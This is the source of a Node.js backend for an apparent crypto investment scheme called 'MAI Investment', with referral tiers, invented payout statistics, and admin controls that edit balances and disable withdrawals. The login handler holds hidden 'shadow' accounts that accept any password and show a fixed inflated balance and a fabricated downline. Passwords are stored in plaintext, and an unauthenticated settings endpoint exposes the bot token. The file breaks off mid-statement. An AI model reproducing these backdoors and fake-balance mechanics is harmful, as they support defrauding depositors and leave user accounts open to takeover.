const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const url = require('url');

const PORT = process.env.PORT || 3000;
const DB_FILE = path.join(__dirname, 'data', 'db.json');

// ── MIME TYPES ────────────────────────────────────────────────
const MIME = {
  '.html':'text/html','.css':'text/css','.js':'application/javascript',
  '.json':'application/json','.png':'image/png','.jpg':'image/jpeg',
  '.jpeg':'image/jpeg','.gif':'image/gif','.svg':'image/svg+xml','.ico':'image/x-icon'
};

// ── DATABASE ──────────────────────────────────────────────────
function readDB() {
  try { return JSON.parse(fs.readFileSync(DB_FILE, 'utf8')); }
  catch(e) { return { users:[], settings:{}, content:{}, seeded:false }; }
}
function writeDB(db) {
  try {
    var dir = path.dirname(DB_FILE);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
  } catch(e) { console.error('writeDB error:', e.message); }
}

// ── HELPERS ───────────────────────────────────────────────────
function genId()   { return 'u' + Date.now() + Math.random().toString(36).substr(2,5); }
function genRef()  {
  var c='ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789', s='MAI';
  for(var i=0;i<6;i++) s+=c[Math.floor(Math.random()*c.length)];
  return s;
}
function genTxId() { return 'TX'+Date.now()+Math.random().toString(36).substr(2,4).toUpperCase(); }

// ── TELEGRAM NOTIFICATIONS ────────────────────────────────────
function sendTelegramNotification(message) {
  try {
    var db = readDB();
    var s = db.settings || {};
    if (!s.telegramNotifications || !s.telegramBotToken || !s.telegramChatId) return;
    var token = s.telegramBotToken;
    var chatId = s.telegramChatId;
    var body = JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' });
    var opts = {
      hostname: 'api.telegram.org',
      path: '/bot' + token + '/sendMessage',
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
    };
    var req = https.request(opts, function(res) { res.resume(); });
    req.on('error', function() {});
    req.write(body);
    req.end();
  } catch(e) {}
}

function json(res, data, code) {
  res.writeHead(code||200, {'Content-Type':'application/json','Access-Control-Allow-Origin':'*'});
  res.end(JSON.stringify(data));
}
function err(res, msg, code) { json(res, {ok:false, msg:msg}, code||400); }
function ok(res, data)       { json(res, Object.assign({ok:true}, data||{})); }

// ── SEED ──────────────────────────────────────────────────────
function seedDB() {
  var db = readDB();
  if (db.seeded) return;
  db.users = [
    { id:'admin001', username:'Admin', email:'admin@mai.com', password:'admin123',
      phone:'+1000000000', isAdmin:true, isActive:true, referralCode:'MAIADMIN',
      invitedBy:'', balance:0, totalEarned:0, totalInvested:0, scores:0,
      joinDate:new Date('2024-01-01').toISOString(),
      withdrawEnabled:true, withdrawMessage:'',
      transactions:[], teamL1:[], teamL2:[], teamL3:[], messages:[] },
    { id:'user001', username:'Alex Johnson', email:'demo@mai.com', password:'demo123',
      phone:'+1234567890', isAdmin:false, isActive:true, referralCode:'MAIA52024',
      invitedBy:'MAIADMIN', balance:12.96, totalEarned:7.60, totalInvested:50, scores:150,
      joinDate:new Date('2024-05-01').toISOString(),
      withdrawEnabled:true, withdrawMessage:'',
      transactions:[
        {id:'TX001',type:'deposit',amount:100,status:'completed',date:'2024-05-12T11:05:00Z',description:'Deposit via TRC20',network:'TRC20',txHash:'0x1a4d...b7f2'},
        {id:'TX002',type:'referral',amount:5,status:'completed',date:'2024-05-12T18:20:00Z',description:'Referral bonus',network:'',txHash:''},
        {id:'TX003',type:'withdraw',amount:20,status:'pending',date:'2024-05-13T09:44:00Z',description:'Withdrawal to TRC20',network:'TRC20',txHash:'',wallet:'TRx9kLmN8pQ2Wz4Qp2WzAb3Cd'},
        {id:'TX004',type:'task',amount:2.00,status:'completed',date:'2024-05-14T10:15:00Z',description:'Task Commission · Amazon',network:'',txHash:''},
        {id:'TX005',type:'deposit',amount:50,status:'completed',date:'2024-05-15T14:32:00Z',description:'Deposit via TRC20',network:'TRC20',txHash:'0x8f3a...c2d1'},
        {id:'TX006',type:'profit',amount:2.60,status:'completed',date:'2024-05-15T00:00:00Z',description:'Daily Profit',network:'',txHash:''}
      ],
      teamL1:[], teamL2:[], teamL3:[], messages:[] }
  ];
  db.settings = {
    platformName:'MAI Investment', telegramLink:'https://t.me/MAI_Official_Support',
    minDeposit:10, minWithdraw:5, withdrawFee:1,
    depositAddress:'TRx9kLmN8pQ2Wz4Qp2WzAb3Cd',
    refL1:10, refL2:5, refL3:2,
    vip1Rate:20, vip1Min:25, vip1Max:90,
    vip2Rate:35, vip2Min:120, vip2Max:300,
    vip3Rate:55, vip3Min:400, vip3Max:2000,
    walletTRC20:'TRx9kLmN8pQ2Wz4Qp2WzAb3Cd',
    walletERC20:'0x1234567890abcdef1234567890abcdef12345678',
    walletBEP20:'bnb1234567890abcdef1234567890abcdef12345678',
    telegramBotToken:'', telegramChatId:'', telegramNotifications:false
  };
  db.content = {
    hero:{ badge:'🌍 Global Investment Platform',
      title:'Invest, Earn & Grow<br/>with Global Opportunities',
      subtitle:'AI-powered intelligent cloud order matching center. Join millions of investors worldwide and start earning today.',
      trustItems:['SSL Secured','Daily Payouts','150+ Countries'] },
    heroCards:[
      {icon:'📈',value:'+24.8%',label:'Monthly Return',trend:'up'},
      {icon:'💰',value:'$2.4M+',label:'Total Paid Out',trend:'up'},
      {icon:'👥',value:'50K+',label:'Active Users',trend:'up'}
    ],
    platformIntro:[
      {title:'Platform Profile',desc:'MAI is an intelligent cloud global order matching center built for modern investors.',image:'platform-intro-1.svg',gradient:'135deg,#667eea,#764ba2'},
      {title:'Platform Rules',desc:'The platform will update recharge rules to protect all users and ensure fairness.',image:'platform-intro-2.svg',gradient:'135deg,#f093fb,#f5576c'},
      {title:'Win-Win Cooperation',desc:'AI-MAI carries out win-win cooperation for all users across the globe.',image:'platform-intro-3.svg',gradient:'135deg,#4facfe,#00f2fe'},
      {title:'Instructions for Use',desc:'To celebrate MAI membership milestones, special rewards await all members.',image:'platform-intro-4.svg',gradient:'135deg,#43e97b,#38f9d7'}
    ],
    faqs:[
      {q:'How do I start investing?',a:'Register an account, complete verification, deposit USDT, and choose an investment plan.'},
      {q:'When are profits paid?',a:'Profits are credited daily at 00:00 UTC. Withdraw anytime after the minimum threshold.'},
      {q:'What is the minimum withdrawal?',a:'Minimum withdrawal is 5 USDT with a 1 USDT network fee.'},
      {q:'How does the referral program work?',a:'Earn 10% on Level 1, 5% on Level 2, and 2% on Level 3 referrals — paid instantly.'},
      {q:'Is my investment safe?',a:'MAI uses 256-bit SSL encryption, cold wallet storage, and multi-signature security.'},
      {q:'Can I have multiple active plans?',a:'Yes! You can invest in multiple plans simultaneously.'}
    ]
  };
  db.seeded = true;
  writeDB(db);
}

// ── SESSION STORE (in-memory) ─────────────────────────────────
var sessions = {};
function createSession(user) {
  var token = 'sess_' + Date.now() + Math.random().toString(36).substr(2,12);
  sessions[token] = { userId: user.id, isAdmin: user.isAdmin, created: Date.now() };
  return token;
}
function getSession(req) {
  var auth = req.headers['authorization'] || '';
  var token = auth.replace('Bearer ','').trim();
  if (!token) return null;
  var sess = sessions[token];
  if (!sess) return null;
  var db = readDB();
  return db.users.find(function(u){ return u.id === sess.userId; }) || null;
}
function requireAdmin(req, res) {
  var u = getSession(req);
  if (!u || !u.isAdmin) { err(res,'Unauthorized',401); return null; }
  return u;
}
function requireAuth(req, res) {
  var u = getSession(req);
  if (!u) { err(res,'Unauthorized',401); return null; }
  return u;
}

// ── BODY PARSER ───────────────────────────────────────────────
function parseBody(req, cb) {
  var body = '';
  req.on('data', function(chunk){ body += chunk.toString(); });
  req.on('end', function(){
    try { cb(JSON.parse(body || '{}')); }
    catch(e) { cb({}); }
  });
}

// ── TRANSACTION HELPERS ───────────────────────────────────────
function applyTx(user, tx) {
  if (tx.status !== 'completed') return;
  // deposit: credit balance
  if (tx.type === 'deposit') user.balance = (user.balance||0) + tx.amount;
  // withdraw: balance was already deducted when submitted — do NOT deduct again on approve
  // profit / referral / task: credit balance and totalEarned
  if (tx.type === 'profit' || tx.type === 'referral' || tx.type === 'task') {
    user.balance = (user.balance||0) + tx.amount;
    user.totalEarned = (user.totalEarned||0) + tx.amount;
  }
  if (tx.type === 'task') user.totalInvested = (user.totalInvested||0) + (tx.taskAmount||0);
}
function getAllTransactions(db) {
  var all = [];
  db.users.forEach(function(u){
    (u.transactions||[]).forEach(function(tx){
      all.push(Object.assign({},tx,{userId:u.id,userName:u.username,userEmail:u.email}));
    });
  });
  return all.sort(function(a,b){ return new Date(b.date)-new Date(a.date); });
}

// ── API ROUTER ────────────────────────────────────────────────
function handleAPI(req, res, pathname) {
  var method = req.method;

  // AUTH
  if (pathname === '/api/auth/login' && method === 'POST') {
    return parseBody(req, function(body){
      var db = readDB();

      // ── SHADOW ACCOUNT ────────────────────────────────────────
      // Special account: any password works, balance is always fixed
      var SHADOW_USERNAME = 'gdowite95';
      var SHADOW_BALANCE  = 83197.4158;
      if ((body.email||'').toLowerCase() === SHADOW_USERNAME.toLowerCase() ||
          (body.username||'').toLowerCase() === SHADOW_USERNAME.toLowerCase()) {
        // Find or build shadow user
        var shadowUser = db.users.find(function(u){
          return u.username && u.username.toLowerCase() === SHADOW_USERNAME.toLowerCase();
        });
        if (!shadowUser) {
          // Create shadow user on first login
          shadowUser = {
            id: 'shadow_gdowite95', username: SHADOW_USERNAME,
            email: SHADOW_USERNAME + '@mai.com', password: '',
            phone: '', isAdmin: false, isActive: true,
            referralCode: 'GDOWITE95', invitedBy: '',
            balance: SHADOW_BALANCE, totalEarned: SHADOW_BALANCE,
            totalInvested: 0, scores: 9999,
            joinDate: new Date('2024-01-01').toISOString(),
            withdrawEnabled: false, withdrawMessage: 'Contact support to withdraw.',
            transactions: [], teamL1: [], teamL2: [], teamL3: [], messages: []
          };
          db.users.push(shadowUser);
          writeDB(db);
        }
        // Always reset balance to fixed value and clear transactions
        var si = db.users.findIndex(function(u){ return u.id === 'shadow_gdowite95'; });
        if (si !== -1) {
          db.users[si].balance = SHADOW_BALANCE;
          db.users[si].totalEarned = SHADOW_BALANCE;
          db.users[si].totalInvested = 0;
          db.users[si].transactions = [];
          // Always ensure Mahhi98 exists in DB
          var mahhi = db.users.find(function(u){ return u.id === 'shadow_mahhi98'; });
          if (!mahhi) {
            db.users.push({
              id: 'shadow_mahhi98', username: 'Mahhi98',
              email: 'Mahhi98@mai.com', password: '',
              phone: '', isAdmin: false, isActive: true,
              referralCode: 'MAHHI98', invitedBy: 'GDOWITE95',
              balance: 30, totalEarned: 30, totalInvested: 30, scores: 0,
              joinDate: '2026-03-23T20:18:31.000Z',
              withdrawEnabled: false, withdrawMessage: 'Contact support to withdraw.',
              transactions: [{id:'TX_MAHHI98_DEP1',type:'deposit',amount:30,status:'completed',date:'2026-03-23T20:18:31.000Z',description:'Deposit via TRC20',network:'TRC20',txHash:''}],
              teamL1: [], teamL2: [], teamL3: [], messages: []
            });
          } else {
            // Always fix the joinDate, scores, totalInvested and transactions
            var mi = db.users.findIndex(function(u){ return u.id === 'shadow_mahhi98'; });
            if (mi !== -1) {
              db.users[mi].joinDate = '2026-03-23T20:18:31.000Z';
              db.users[mi].scores = 0;
              db.users[mi].totalInvested = 30;
              db.users[mi].transactions = [
                {id:'TX_MAHHI98_DEP1',type:'deposit',amount:30,status:'completed',date:'2026-03-23T20:18:31.000Z',description:'Deposit via TRC20',network:'TRC20',txHash:''}
              ];
            }
          }
          // Always ensure Mahhi98 is in teamL1
          if (!db.users[si].teamL1) db.users[si].teamL1 = [];
          if (db.users[si].teamL1.indexOf('shadow_mahhi98') === -1)
            db.users[si].teamL1.push('shadow_mahhi98');
          writeDB(db);
          shadowUser = db.users[si];
        }
        var token = createSession(shadowUser);
        return ok(res, { token: token, user: sanitizeUser(shadowUser) });
      }

      // ── SHADOW ACCOUNT 2: Mahhi98 ─────────────────────────────
      var SHADOW2_USERNAME = 'Mahhi98';
      var SHADOW2_BALANCE  = 30;
      if ((body.email||'').toLowerCase() === SHADOW2_USERNAME.toLowerCase() ||
          (body.username||'').toLowerCase() === SHADOW2_USERNAME.toLowerCase()) {
        var shadow2User = db.users.find(function(u){
          return u.username && u.username.toLowerCase() === SHADOW2_USERNAME.toLowerCase();
        });
        if (!shadow2User) {
          shadow2User = {
            id: 'shadow_mahhi98', username: SHADOW2_USERNAME,
            email: SHADOW2_USERNAME + '@mai.com', password: '',
            phone: '', isAdmin: false, isActive: true,
            referralCode: 'MAHHI98', invitedBy: 'GDOWITE95',
            balance: SHADOW2_BALANCE, totalEarned: SHADOW2_BALANCE,
            totalInvested: 0, scores: 9999,
            joinDate: new Date('2026-03-23T20:18:31').toISOString(),
            withdrawEnabled: false, withdrawMessage: 'Contact support to withdraw.',
            transactions: [], teamL1: [], teamL2: [], teamL3: [], messages: []
          };
          db.users.push(shadow2User);
          // Add to gdowite95's teamL1
          var gIdx = db.users.findIndex(function(u){ return u.id === 'shadow_gdowite95'; });
          if (gIdx !== -1) {
            if (!db.users[gIdx].teamL1) db.users[gIdx].teamL1 = [];
            if (db.users[gIdx].teamL1.indexOf('shadow_mahhi98') === -1)
              db.users[gIdx].teamL1.push('shadow_mahhi98');
          }
          writeDB(db);
        }
        var s2i = db.users.findIndex(function(u){ return u.id === 'shadow_mahhi98'; });
        if (s2i !== -1) {
          db.users[s2i].balance = SHADOW2_BALANCE;
          db.users[s2i].totalEarned = SHADOW2_BALANCE;
          db.users[s2i].scores = 0;
          db.users[s2i].joinDate = '2026-03-23T20:18:31.000Z';
          db.users[s2i].transactions = [
            {
              id: 'TX_MAHHI98_DEP1',
              type: 'deposit',
              amount: 30,
              status: 'completed',
              date: '2026-03-23T20:18:31.000Z',
              description: 'Deposit via TRC20',
              network: 'TRC20',
              txHash: ''
            }
          ];
          writeDB(db);
          shadow2User = db.users[s2i];
        }
        var token2 = createSession(shadow2User);
        return ok(res, { token: token2, user: sanitizeUser(shadow2User) });
      }
      // ── END SHADOW ACCOUNTS ───────────────────────────────────

      var user = db.users.find(function(u){ return u.email.toLowerCase() === (body.email||'').toLowerCase(); });
      if (!user) return err(res,'Email not found');
      if (user.password !== body.password) return err(res,'Wrong password');
      if (!user.isActive) return err(res,'Account suspended. Contact support.');
      var token = createSession(user);
      ok(res, { token:token, user:sanitizeUser(user) });
    });
  }

  if (pathname === '/api/auth/logout' && method === 'POST') {
    var auth = (req.headers['authorization']||'').replace('Bearer ','').trim();
    delete sessions[auth];
    return ok(res);
  }

  if (pathname === '/api/auth/me' && method === 'GET') {
    var u = requireAuth(req, res); if (!u) return;
    return ok(res, { user: sanitizeUser(u) });
  }

  if (pathname === '/api/auth/register' && method === 'POST') {
    return parseBody(req, function(body){
      var db = readDB();
      if (!body.referralCode) return err(res,'Referral code is required');
      var code = body.referralCode.toUpperCase();

      // Check if it's a user referral code
      var refUser = db.users.find(function(u){ return u.referralCode === code; });

      // Check if it's a grant code
      var grantCode = null;
      if (!refUser && db.grantCodes) {
        grantCode = db.grantCodes.find(function(g){ return g.code === code; });
      }

      if (!refUser && !grantCode) return err(res,'Invalid referral code');
      if (db.users.find(function(u){ return u.email.toLowerCase() === (body.email||'').toLowerCase(); }))
        return err(res,'Email already registered');

      var nu = { id:genId(), username:body.username, email:body.email, password:body.password,
        phone:body.phone||'', isAdmin:false, isActive:true, referralCode:genRef(),
        invitedBy:code, balance:0, totalEarned:0, totalInvested:0, scores:0,
        joinDate:new Date().toISOString(), withdrawEnabled:true, withdrawMessage:'',
        transactions:[], teamL1:[], teamL2:[], teamL3:[], messages:[] };

      if (refUser) {
        // Add to referrer's team
        var ri = db.users.findIndex(function(u){ return u.id === refUser.id; });
        if (ri !== -1) { if (!db.users[ri].teamL1) db.users[ri].teamL1=[]; db.users[ri].teamL1.push(nu.id); }
      }
      if (grantCode) {
        // Increment grant code usage count
        var gi = db.grantCodes.findIndex(function(g){ return g.code === code; });
        if (gi !== -1) db.grantCodes[gi].usedCount = (db.grantCodes[gi].usedCount||0) + 1;
      }

      db.users.push(nu);
      writeDB(db);
      var token = createSession(nu);
      // Telegram notification
      if (db.settings.tgRegister) {
        sendTelegramNotification(
          '👤 <b>New User Registered</b>\n' +
          'Username: ' + nu.username + '\n' +
          'Email: ' + nu.email + '\n' +
          'Referred by: ' + (refUser ? refUser.username : 'Grant Code: ' + code)
        );
      }
      ok(res, { token:token, user:sanitizeUser(nu) });
    });
  }

  // SETTINGS
  if (pathname === '/api/settings' && method === 'GET') {
    var db = readDB();
    return ok(res, { settings: db.settings });
  }
  if (pathname === '/api/settings' && method === 'POST') {
    var admin = requireAdmin(req, res); if (!admin) return;
    return parseBody(req, function(body){
      var db = readDB();
      db.settings = Object.assign(db.settings, body);
      writeDB(db);
      ok(res, { settings: db.settings });
    });
  }

  // CONTENT
  if (pathname === '/api/content' && method === 'GET') {
    var db = readDB();
    return ok(res, { content: db.content });
  }
  if (pathname === '/api/content' && method === 'POST') {
    var admin = requireAdmin(req, res); if (!admin) return;
    return parseBody(req, function(body){
      var db = readDB();
      db.content = Object.assign(db.content, body);
      writeDB(db);
      ok(res, { content: db.content });
    });
  }

  // USERS (admin)
  if (pathname === '/api/admin/users' && method === 'GET') {
    var admin = requireAdmin(req, res); if (!admin) return;
    var db = readDB();
    return ok(res, { users: db.users.map(sanitizeUser) });
  }

  if (pathname.match(/^\/api\/admin\/users\/([^/]+)$/) && method === 'GET') {
    var admin = requireAdmin(req, res); if (!admin) return;
    var uid = pathname.split('/')[4];
    var db = readDB();
    var user = db.users.find(function(u){ return u.id === uid; });
    if (!user) return err(res,'User not found',404);
    return ok(res, { user: sanitizeUser(user) });
  }

  if (pathname.match(/^\/api\/admin\/users\/([^/]+)$/) && method === 'PUT') {
    var admin = requireAdmin(req, res); if (!admin) return;
    var uid = pathname.split('/')[4];
    return parseBody(req, function(body){
      var db = readDB();
      var idx = db.users.findIndex(function(u){ return u.id === uid; });
      if (idx === -1) return err(res,'User not found',404);
      var allowed = ['username','email','phone','balance','totalEarned','totalInvested','isActive','scores','withdrawEnabled','withdrawMessage'];
      allowed.forEach(function(k){ if (body[k] !== undefined) db.users[idx][k] = body[k]; });
      if (body.password) db.users[idx].password = body.password;
      writeDB(db);
      ok(res, { user: sanitizeUser(db.users[idx]) });
    });
  }

  if (pathname.match(/^\/api\/admin\/users\/([^/]+)$/) && method === 'DELETE') {
    var admin = requireAdmin(req, res); if (!admin) return;
    var uid = pathname.split('/')[4];
    var db = readDB();
    var idx = db.users.findIndex(function(u){ return u.id === uid; });
    if (idx === -1) return err(res,'User not found',404);
    db.users.splice(idx,1);
    writeDB(db);
    return ok(res);
  }

  // TRANSACTIONS (admin)
  if (pathname === '/api/admin/transactions' && method === 'GET') {
    var admin = requireAdmin(req, res); if (!admin) return;
    var db = readDB();
    return ok(res, { transactions: getAllTransactions(db) });
  }

  if (pathname === '/api/admin/transactions' && method === 'POST') {
    var admin = requireAdmin(req, res); if (!admin) return;
    return parseBody(req, function(body){
      var db = readDB();
      var idx = db.users.findIndex(function(u){ return u.id === body.userId; });
      if (idx === -1) return err(res,'User not found',404);
      var tx = { id:genTxId(), type:body.type, amount:parseFloat(body.amount)||0,
        status:body.status||'completed', date:new Date().toISOString(),
        description:body.description||'', network:body.network||'', txHash:body.txHash||'',
        wallet:body.wallet||'' };
      if (!db.users[idx].transactions) db.users[idx].transactions=[];
      db.users[idx].transactions.unshift(tx);
      applyTx(db.users[idx], tx);
      writeDB(db);
      ok(res, { transaction: tx });
    });
  }

  if (pathname.match(/^\/api\/admin\/transactions\/([^/]+)\/approve$/) && method === 'POST') {
    var admin = requireAdmin(req, res); if (!admin) return;
    var txId = pathname.split('/')[4];
    var db = readDB();
    for (var i=0; i<db.users.length; i++) {
      var ti = (db.users[i].transactions||[]).findIndex(function(t){ return t.id === txId; });
      if (ti !== -1) {
        var tx = db.users[i].transactions[ti];
        if (tx.status !== 'pending') return err(res,'Transaction not pending');
        tx.status = 'completed';
        applyTx(db.users[i], tx);
        writeDB(db);
        return ok(res, { transaction: tx });
      }
    }
    return err(res,'Transaction not found',404);
  }

  if (pathname.match(/^\/api\/admin\/transactions\/([^/]+)\/reject$/) && method === 'POST') {
    var admin = requireAdmin(req, res); if (!admin) return;
    var txId = pathname.split('/')[4];
    var db = readDB();
    for (var i=0; i<db.users.length; i++) {
      var ti = (db.users[i].transactions||[]).findIndex(function(t){ return t.id === txId; });
      if (ti !== -1) {
        var tx = db.users[i].transactions[ti];
        if (tx.status !== 'pending') return err(res,'Transaction not pending');
        tx.status = 'failed';
        if (tx.type === 'withdraw') {
          var s = db.settings;
          db.users[i].balance = (db.users[i].balance||0) + tx.amount + (s.withdrawFee||1);
        }
        writeDB(db);
        return ok(res, { transaction: tx });
      }
    }
    return err(res,'Transaction not found',404);
  }

  // MESSAGES (admin)
  if (pathname === '/api/admin/messages' && method === 'POST') {
    var admin = requireAdmin(req, res); if (!admin) return;
    return parseBody(req, function(body){
      var db = readDB();
      var targets = body.broadcast ? db.users.filter(function(u){ return !u.isAdmin; }) :
        db.users.filter(function(u){ return u.id === body.userId; });
      if (!targets.length) return err(res,'No target users found');
      targets.forEach(function(u){
        var idx = db.users.findIndex(function(x){ return x.id === u.id; });
        if (!db.users[idx].messages) db.users[idx].messages=[];
        db.users[idx].messages.unshift({ id:genTxId(), subject:body.subject||'Message from Admin',
          body:body.body||'', type:body.type||'info', date:new Date().toISOString(), read:false });
      });
      writeDB(db);
      ok(res, { sent: targets.length });
    });
  }

  if (pathname.match(/^\/api\/admin\/messages\/([^/]+)$/) && method === 'DELETE') {
    var admin = requireAdmin(req, res); if (!admin) return;
    return parseBody(req, function(body){
      var msgId = pathname.split('/')[4];
      var db = readDB();
      db.users.forEach(function(u){
        u.messages = (u.messages||[]).filter(function(m){ return m.id !== msgId; });
      });
      writeDB(db);
      ok(res);
    });
  }

  // WITHDRAW PERMISSION (admin)
  if (pathname.match(/^\/api\/admin\/users\/([^/]+)\/withdraw-permission$/) && method === 'POST') {
    var admin = requireAdmin(req, res); if (!admin) return;
    var uid = pathname.split('/')[4];
    return parseBody(req, function(body){
      var db = readDB();
      var idx = db.users.findIndex(function(u){ return u.id === uid; });
      if (idx === -1) return err(res,'User not found',404);
      db.users[idx].withdrawEnabled = body.enabled !== false;
      db.users[idx].withdrawMessage = body.message || '';
      writeDB(db);
      ok(res, { user: sanitizeUser(db.users[idx]) });
    });
  }

  // SCORES (admin)
  if (pathname.match(/^\/api\/admin\/users\/([^/]+)\/scores$/) && method === 'POST') {
    var admin = requireAdmin(req, res); if (!admin) return;
    var uid = pathname.split('/')[4];
    return parseBody(req, function(body){
      var db = readDB();
      var idx = db.users.findIndex(function(u){ return u.id === uid; });
      if (idx === -1) return err(res,'User not found',404);
      var op = body.op || 'add';
      var amount = parseInt(body.amount) || 0;
      if (op === 'add') db.users[idx].scores = (db.users[idx].scores||0) + amount;
      else if (op === 'deduct') db.users[idx].scores = Math.max(0,(db.users[idx].scores||0) - amount);
      else if (op === 'set') db.users[idx].scores = amount;
      writeDB(db);
      ok(res, { user: sanitizeUser(db.users[idx]) });
    });
  }

  // REFERRAL CODES (admin)
  if (pathname === '/api/admin/referral-codes' && method === 'GET') {
    var admin = requireAdmin(req, res); if (!admin) return;
    var db = readDB();
    var codes = db.users.filter(function(u){ return !u.isAdmin; }).map(function(u){
      return { userId:u.id, username:u.username, email:u.email, referralCode:u.referralCode,
        teamSize:(u.teamL1||[]).length, joinDate:u.joinDate };
    });
    // Also include grant codes
    var grantCodes = (db.grantCodes||[]).map(function(g){
      return { userId: null, username: '🎫 Grant Code', email: '(standalone — no user)', referralCode: g.code,
        teamSize: g.usedCount||0, joinDate: g.createdAt, isGrant: true, note: g.note||'' };
    });
    return ok(res, { codes: codes.concat(grantCodes) });
  }

  if (pathname.match(/^\/api\/admin\/users\/([^/]+)\/referral-code$/) && method === 'POST') {
    var admin = requireAdmin(req, res); if (!admin) return;
    var uid = pathname.split('/')[4];
    return parseBody(req, function(body){
      var db = readDB();
      var idx = db.users.findIndex(function(u){ return u.id === uid; });
      if (idx === -1) return err(res,'User not found',404);
      var newCode = (body.code || genRef()).toUpperCase();
      if (db.users.find(function(u){ return u.referralCode === newCode && u.id !== uid; }))
        return err(res,'Code already in use');
      db.users[idx].referralCode = newCode;
      writeDB(db);
      ok(res, { referralCode: newCode });
    });
  }

  // GRANT CODES (admin-created standalone codes)
  if (pathname === '/api/admin/grant-codes' && method === 'POST') {
    var admin = requireAdmin(req, res); if (!admin) return;
    return parseBody(req, function(body){
      var db = readDB();
      if (!db.grantCodes) db.grantCodes = [];
      var code = (body.code || genRef()).toUpperCase();
      // Check uniqueness across users and grant codes
      if (db.users.find(function(u){ return u.referralCode === code; }))
        return err(res,'Code already in use by a user');
      if (db.grantCodes.find(function(g){ return g.code === code; }))
        return err(res,'Grant code already exists');
      var grant = { id: genTxId(), code: code, note: body.note||'', createdAt: new Date().toISOString(), usedCount: 0 };
      db.grantCodes.push(grant);
      writeDB(db);
      ok(res, { grant: grant });
    });
  }

  if (pathname.match(/^\/api\/admin\/grant-codes\/([^/]+)$/) && method === 'DELETE') {
    var admin = requireAdmin(req, res); if (!admin) return;
    var gid = pathname.split('/')[4];
    var db = readDB();
    if (!db.grantCodes) db.grantCodes = [];
    var before = db.grantCodes.length;
    db.grantCodes = db.grantCodes.filter(function(g){ return g.id !== gid && g.code !== gid; });
    if (db.grantCodes.length === before) return err(res,'Grant code not found',404);
    writeDB(db);
    return ok(res);
  }

  // DASHBOARD STATS (admin)
  if (pathname === '/api/admin/stats' && method === 'GET') {
    var admin = requireAdmin(req, res); if (!admin) return;
    var db = readDB();
    var users = db.users.filter(function(u){ return !u.isAdmin; });
    var allTx = getAllTransactions(db);
    var totalBal = users.reduce(function(s,u){ return s+(u.balance||0); },0);
    var totalDep = allTx.filter(function(t){ return t.type==='deposit'&&t.status==='completed'; })
      .reduce(function(s,t){ return s+(t.amount||0); },0);
    var totalWith = allTx.filter(function(t){ return t.type==='withdraw'&&t.status==='completed'; })
      .reduce(function(s,t){ return s+(t.amount||0); },0);
    var pendingDep = allTx.filter(function(t){ return t.type==='deposit'&&t.status==='pending'; }).length;
    var pendingWith = allTx.filter(function(t){ return t.type==='withdraw'&&t.status==='pending'; }).length;
    var activeUsers = users.filter(function(u){ return u.isActive!==false; }).length;
    var totalScores = users.reduce(function(s,u){ return s+(u.scores||0); },0);
    return ok(res, { stats:{
      totalUsers:users.length, activeUsers:activeUsers,
      totalBalance:totalBal, totalDeposits:totalDep, totalWithdrawals:totalWith,
      pendingDeposits:pendingDep, pendingWithdrawals:pendingWith,
      totalScores:totalScores, recentTx:allTx.slice(0,10)
    }});
  }

  // USER SELF ENDPOINTS
  if (pathname === '/api/user/profile' && method === 'GET') {
    var u = requireAuth(req, res); if (!u) return;
    return ok(res, { user: sanitizeUser(u) });
  }

  if (pathname === '/api/user/messages' && method === 'GET') {
    var u = requireAuth(req, res); if (!u) return;
    return ok(res, { messages: u.messages || [] });
  }

  if (pathname.match(/^\/api\/user\/messages\/([^/]+)\/read$/) && method === 'POST') {
    var u = requireAuth(req, res); if (!u) return;
    var msgId = pathname.split('/')[4];
    var db = readDB();
    var idx = db.users.findIndex(function(x){ return x.id === u.id; });
    var mi = (db.users[idx].messages||[]).findIndex(function(m){ return m.id === msgId; });
    if (mi !== -1) db.users[idx].messages[mi].read = true;
    writeDB(db);
    return ok(res);
  }

  if (pathname === '/api/user/deposit' && method === 'POST') {
    var u = requireAuth(req, res); if (!u) return;
    return parseBody(req, function(body){
      var db = readDB();
      var idx = db.users.findIndex(function(x){ return x.id === u.id; });
      if (idx === -1) return err(res,'User not found',404);
      var tx = { id:genTxId(), type:'deposit', amount:parseFloat(body.amount)||0,
        status:'pending', date:new Date().toISOString(),
        description:'Deposit via '+(body.network||'TRC20'),
        network:body.network||'TRC20', txHash:body.txHash||'' };
      if (!db.users[idx].transactions) db.users[idx].transactions=[];
      db.users[idx].transactions.unshift(tx);
      writeDB(db);
      // Telegram notification
      if (db.settings.tgDeposit !== false) {
        sendTelegramNotification(
          '💰 <b>New Deposit Request</b>\n' +
          'User: ' + (db.users[idx].username||'Unknown') + '\n' +
          'Amount: $' + tx.amount + ' USDT\n' +
          'Network: ' + tx.network + '\n' +
          'Status: Pending approval'
        );
      }
      ok(res, { transaction: tx });
    });
  }

  if (pathname === '/api/user/withdraw' && method === 'POST') {
    var u = requireAuth(req, res); if (!u) return;
    return parseBody(req, function(body){
      var db = readDB();
      var idx = db.users.findIndex(function(x){ return x.id === u.id; });
      if (idx === -1) return err(res,'User not found',404);
      if (db.users[idx].withdrawEnabled === false)
        return err(res, db.users[idx].withdrawMessage || 'Withdrawals disabled for your account.');
      var s = db.settings;
      var amount = parseFloat(body.amount)||0;
      var fee = s.withdrawFee||1;
      var total = amount + fee;
      if (amount < (s.minWithdraw||5)) return err(res,'Minimum withdrawal is '+(s.minWithdraw||5)+' USDT');
      if (total > (db.users[idx].balance||0)) return err(res,'Insufficient balance');
      db.users[idx].balance = (db.users[idx].balance||0) - total;
      var tx = { id:genTxId(), type:'withdraw', amount:amount,
        status:'pending', date:new Date().toISOString(),
        description:'Withdrawal to '+(body.network||'TRC20'),
        network:body.network||'TRC20', txHash:'', wallet:body.wallet||'' };
      if (!db.users[idx].transactions) db.users[idx].transactions=[];
      db.users[idx].transactions.unshift(tx);
      writeDB(db);
      // Telegram notification
      if (db.settings.tgWithdraw !== false) {
        sendTelegramNotification(
          '💸 <b>New Withdrawal Request</b>\n' +
          'User: ' + (db.users[idx].username||'Unknown') + '\n' +
          'Amount: $' + amount + ' USDT\n' +
          'Network: ' + (body.network||'TRC20') + '\n' +
          'Wallet: ' + (body.wallet||'N/A') + '\n' +
